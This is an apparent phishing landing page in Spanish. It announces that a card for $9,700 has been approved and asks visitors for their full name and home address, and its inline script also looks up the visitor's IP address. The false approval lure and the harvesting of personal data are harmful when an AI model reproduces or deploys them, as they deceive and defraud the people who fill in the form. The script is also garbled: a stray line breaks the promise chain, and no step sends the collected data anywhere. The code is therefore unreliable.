<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Tarjeta aprobada</title>

  <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@300;400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg:#f6f7fb;
      --card:#ffffff;
      --accent:#0a2b5a;
      --muted:#9aa0a8;
      --yellow:#ffe79a;
      --shadow:0 8px 30px rgba(10,43,90,0.08);
    }
    body{
      margin:0;
      font-family:"Inter",sans-serif;
      background:var(--bg);
      color:#222;
    }
    .hero{
      min-height:35vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:48px 20px;
      background:linear-gradient(180deg,#0a2b5a,#193b72);
      color:#fff;
      text-align:center;
    }
    .headline{
      font-family:"Merriweather",serif;
      font-size:32px;
      margin:0 0 12px;
      font-weight:700;
    }
    .subhead{font-size:18px;}
    .container{max-width:650px;margin:-40px auto 48px;padding:0 20px;}
    .card{
      background:var(--card);
      border-radius:14px;
      box-shadow:var(--shadow);
      padding:34px;
    }
    .card h2{text-align:center;margin:0 0 18px;font-family:"Merriweather",serif;color:var(--accent);}
    label.field-label{display:block;font-weight:600;color:var(--accent);margin-bottom:6px;}
    .input{
      width:100%;padding:14px;border-radius:8px;
      border:1.5px solid rgba(10,43,90,0.15);
      font-size:16px;margin-bottom:16px;
    }
    .btn{
      display:block;width:100%;padding:14px;border-radius:10px;
      border:none;background:linear-gradient(180deg,var(--yellow),#ffe073);
      color:var(--accent);font-weight:700;font-size:18px;cursor:pointer;
    }
  </style>
</head>
<body>

  <header class="hero">
    <div>
      <h1 class="headline">¡Tenemos buenas noticias para ti!</h1>
      <p class="subhead">Una tarjeta aprobada por <strong>$9.700</strong></p>
    </div>
  </header>

  <main class="container">
    <section class="card">
      <h2>Completa tu dirección</h2>

      <form id="aprobadaForm" novalidate>
        <label class="field-label" for="nombre">Nombre</label>
        <input id="nombre" class="input" type="text" placeholder="Ingresa tu nombre" required />

        <label class="field-label" for="apellido">Apellido</label>
        <input id="apellido" class="input" type="text" placeholder="Ingresa tu apellido" required />

        <label class="field-label" for="direccion">Dirección</label>
        <input id="direccion" class="input" type="text" placeholder="Ingresa tu dirección" required />

        <label class="field-label" for="ciudad">Ciudad</label>
        <input id="ciudad" class="input" type="text" placeholder="Ingresa tu ciudad" required />

        <label class="field-label" for="estado">Estado</label>
        <input id="estado" class="input" type="text" placeholder="Ingresa tu estado" required />

        <label class="field-label" for="barrio">Barrio</label>
        <input id="barrio" class="input" type="text" placeholder="Ingresa tu barrio" required />

        <label class="field-label" for="casa">Número de casa</label>
        <input id="casa" class="input" type="text" placeholder="Ejemplo: 123" required />

        <button type="submit" class="btn">Confirmar dirección</button>
      </form>
    </section>
  </main>

  <script src="trl.js"></script>

  <script>
    document.getElementById('aprobadaForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const campos = ["nombre", "apellido", "direccion", "ciudad", "estado", "barrio", "casa"];
      let formData = {};
      
      // Obtener los datos del formulario
      for (const id of campos) {
        const val = document.getElementById(id).value.trim();
        if (!val) {
          alert("Por favor completa todos los campos.");
          return;
        }
        formData[id] = val;
      }

      // Obtener la IP real del cliente
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())

            console.error('Error al enviar la solicitud:', error);

        .catch(error => {
          console.error('Error al obtener la IP:', error);
        });
    });
  </script>
</body>
</html>
